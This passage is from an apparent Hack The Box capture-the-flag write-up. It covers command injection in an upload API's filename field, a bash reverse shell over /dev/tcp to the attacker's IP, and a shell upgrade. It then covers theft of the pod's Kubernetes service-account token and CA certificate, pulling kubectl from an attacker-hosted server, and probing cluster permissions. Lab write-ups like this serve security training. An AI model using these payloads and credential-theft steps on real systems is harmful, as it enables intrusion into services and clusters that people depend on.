<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -X POST http://10.10.10.235:31337/upload -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;filename&#34;: &#34;test; ping -c 1 10.10.14.15&#34;}&#39;</span>
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;ok&#34;</span>:true,<span style="color:#f1fa8c">&#34;Uploaded_File&#34;</span>:<span style="color:#f1fa8c">&#34;test; ping -c 1 10.10.14.15&#34;</span><span style="color:#ff79c6">}</span>%
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
sudo tcpdump -i utun0 icmp
13:26:54.923247 IP 10.10.10.235 &gt; 10.10.14.15: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 15, seq 1, length <span style="color:#bd93f9">64</span>
13:26:54.923291 IP 10.10.14.15 &gt; 10.10.10.235: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 15, seq 1, length <span style="color:#bd93f9">64</span>
</code></pre></td></tr></table>
</div>
</div><p>RCE successful, we can now get a shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -X POST http://10.10.10.235:31337/upload -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> -d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;filename&#34;: &#34;x; bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.15/9000 0&gt;&amp;1\&#34;&#34;}&#39;</span>
<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;ok&#34;</span>:true,<span style="color:#f1fa8c">&#34;Uploaded_File&#34;</span>:<span style="color:#f1fa8c">&#34;x; bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.15/9000 0&gt;&amp;1\&#34;&#34;</span><span style="color:#ff79c6">}</span>%_
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
_  hackthebox git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> _ nc -lnvp <span style="color:#bd93f9">9000</span>
Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
Connection received on 172.19.0.1 <span style="color:#bd93f9">64302</span>
bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
bash: no job control in this shell
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app#
</code></pre></td></tr></table>
</div>
</div><p>Upgrade the shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# python -c <span style="color:#f1fa8c">&#34;import pty; pty.spawn(&#39;bash&#39;)&#34;</span>
&lt;/src/app# python -c <span style="color:#f1fa8c">&#34;import pty; pty.spawn(&#39;bash&#39;)&#34;</span>
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# ^Z
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">63351</span> suspended  nc -lnvp <span style="color:#bd93f9">9000</span>
_  hackthebox git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> _ stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">63351</span> continued  nc -lnvp <span style="color:#bd93f9">9000</span>
                                     reset
reset: unknown terminal <span style="color:#8be9fd;font-style:italic">type</span> unknown
Terminal type? screen
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# reset
cat /root/user.txt
2c03d7055b76e1ee6d4cb17c4d17f2a1
</code></pre></td></tr></table>
</div>
</div><p>I am clearly in a kubernetes container:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# ls
Dockerfile     index.js      package-lock.json  todo.txt
clear-kubectl  node_modules  package.json
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# ls -la / | grep docker
-rwxr-xr-x   <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">0</span> Sep <span style="color:#bd93f9">10</span> 05:09 .dockerenv
</code></pre></td></tr></table>
</div>
</div><p>I can also get the IP and the LISTENing ports:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# ip address show eth0
6: eth0@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#bd93f9">1500</span> qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid <span style="color:#bd93f9">0</span>
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">511</span>         :::3000                    :::*                   users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;node&#34;</span>,pid<span style="color:#ff79c6">=</span>1,fd<span style="color:#ff79c6">=</span>18<span style="color:#ff79c6">))</span>
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# hostname
webapp-deployment-5d764566f4-h5zhw
</code></pre></td></tr></table>
</div>
</div><h1 id="pentest-kubernetes">Pentest kubernetes</h1>
<h2 id="get-the-token">get the token</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC<span style="color:#f1fa8c">\_\_</span>eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA
</code></pre></td></tr></table>
</div>
</div><h2 id="get-the-namespace">get the namespace</h2>
<p>We have access to the <code>default</code> namespace which is the least privilged: <code>cat /run/secrets/kubernetes.io/serviceaccount/namespace</code></p>
<p>With the stolen <code>token</code> we can <code>curl</code> the Kubernetes API on TCP 8443:</p>
<h2 id="kubectl-api">kubectl API</h2>
<p>install kubectl as per <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">official doc</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -LO <span style="color:#f1fa8c">&#34;https://dl.k8s.io/release/</span><span style="color:#ff79c6">$(</span>curl -L -s https://dl.k8s.io/release/stable.txt<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">/bin/linux/amd64/kubectl&#34;</span>
curl -LO <span style="color:#f1fa8c">&#34;https://dl.k8s.io/</span><span style="color:#ff79c6">$(</span>curl -L -s https://dl.k8s.io/release/stable.txt<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">/bin/linux/amd64/kubectl.sha256&#34;</span>
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span>&lt;kubectl.sha256<span style="color:#ff79c6">)</span><span style="color:#f1fa8c"> kubectl&#34;</span> | sha256sum --check
kubectl: OK
sudo install -o root -g root -m <span style="color:#bd93f9">0755</span> kubectl /usr/local/bin/kubectl
kubectl version --client
Client Version: version.Info<span style="color:#ff79c6">{</span>Major:<span style="color:#f1fa8c">&#34;1&#34;</span>, Minor:<span style="color:#f1fa8c">&#34;22&#34;</span>, GitVersion:<span style="color:#f1fa8c">&#34;v1.22.1&#34;</span>, GitCommit:<span style="color:#f1fa8c">&#34;632ed300f2c34f6d6d15ca4cef3d3c7073412212&#34;</span>, GitTreeState:<span style="color:#f1fa8c">&#34;clean&#34;</span>, BuildDate:<span style="color:#f1fa8c">&#34;2021-08-19T15:45:37Z&#34;</span>, GoVersion:<span style="color:#f1fa8c">&#34;go1.16.7&#34;</span>, Compiler:<span style="color:#f1fa8c">&#34;gc&#34;</span>, Platform:<span style="color:#f1fa8c">&#34;linux/amd64&#34;</span><span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We are missing a signed certificate:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kubectl --token <span style="color:#ff79c6">$(</span>cat default-token<span style="color:#ff79c6">)</span> --server https://10.10.10.235:8443 get pods --all-namespaces
Unable to connect to the server: x509: certificate signed by unknown authorit
</code></pre></td></tr></table>
</div>
</div><p>The certificate can be found on the server itself:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIC5zCCAc+gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMDEwNzEzMjQ0OVoXDTMxMDEwNjEzMjQ0OVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMTC
j3HOO1tahMOPzd68naKhBeiaAZ3iqt/ScnegTglKmtz5DagED5YajZM+UyvPEqQ+
u+mb1Zc1Kbrc2Fg3C48BY7OIP6GfOX990PDKJhqZtaOAdcU5Ga1avS+l3do6V2kC
eVstwX6SVIbzGJEUxMUPiZsFt6HsvN7htP1P5gewwtgsVIXDyLl/eRfwCn2ZW+n3
NgC4OI84zjVHpXmXFaGseDHb/E4wK/N0hMD0DEVPJsEOogHM9LndUgyJmhAtWbEj
25+H8AwQi3/8PYNEsmtSAUEuWtY36px/sD5CthiNlNpkB5t5c1GK90DmyofqBgYv
9wkCNGGZKp3AxMMN2nsCAwEAAaNCMEAwDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
DQEBCwUAA4IBAQAHJjo8Uc3SH1UnsKSwZJTuyj36W/msbMr0pSn3dlE6BouukhF3
9GxmVa2an4/VFJkAsZSqFUz1e52qvJoFJcXec4MiN6GZTWuUA9D/jqiapnHWeO8x
RGk4WN66ZraM0X3PqaHo+cbfhKOlL9jkUxvE+3BWuj9plyD3n9tFe3lnasDfzy4M
q465ixPZqFqVchxQFQ+pZ24KiqoQW4mam/x5FPy13+Mw8J4zb8vLduvLQR3wpUGb
vKXdnKOLWsiExyrjpZjZbYBL8b705XFFGvmabp21aG8psB1XvsLiGFQEqyDfeFRW
hl7KpUISl4+Np5sAiXNwtbSDE+22QVtZbuDn
-----END CERTIFICATE-----
</code></pre></td></tr></table>
</div>
</div><p>We don&rsquo;t have privileges to list pods:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kubectl get pods --token <span style="color:#ff79c6">$(</span>cat default-token<span style="color:#ff79c6">)</span> --server https://10.10.10.235:8443 --certificate-authority ca.crt --all-namespaces
Error from server <span style="color:#ff79c6">(</span>Forbidden<span style="color:#ff79c6">)</span>: pods is forbidden: User <span style="color:#f1fa8c">&#34;system:serviceaccount:default:default&#34;</span> cannot list resource <span style="color:#f1fa8c">&#34;pods&#34;</span> in API group <span style="color:#f1fa8c">&#34;&#34;</span> at the cluster scope
</code></pre></td></tr></table>
</div>
</div><p>In real-life engagement, it is not likely that we have the kubernetes API exposed that easy; that&rsquo;s why it is more realistic to just upload <code>kubectl</code> in the pod. One advantage is that we don&rsquo;t have to specify &ndash;server &ndash;token and &ndash;certificate-authority and &ndash;all-namespaces:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python3 -m http.server <span style="color:#bd93f9">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
172.19.0.1 - - <span style="color:#ff79c6">[</span>11/Sep/2021 14:47:45<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /kubectl HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@webapp-deployment-5d764566f4-h5zhw:/usr/src/app# <span style="color:#8be9fd;font-style:italic">cd</span> /dev/shm
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# curl -sO http://10.10.14.15/kubectl
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# install -o root -g root -m <span style="color:#bd93f9">0755</span> ./kubectl /usr/local/bin/kubectl
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl get pods
Error from server <span style="color:#ff79c6">(</span>Forbidden<span style="color:#ff79c6">)</span>: pods is forbidden: User <span style="color:#f1fa8c">&#34;system:serviceaccount:default:default&#34;</span> cannot list resource <span style="color:#f1fa8c">&#34;pods&#34;</span> in API group <span style="color:#f1fa8c">&#34;&#34;</span> in the namespace <span style="color:#f1fa8c">&#34;default&#34;</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="explore-authorization-with-auth-can-i">explore authorization with auth can-i</h1>
<p>The <code>auth</code> command allows explore resources and privileges on the <code>default</code> namespace. We can list namespaces, and find <code>dev</code> namespace:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
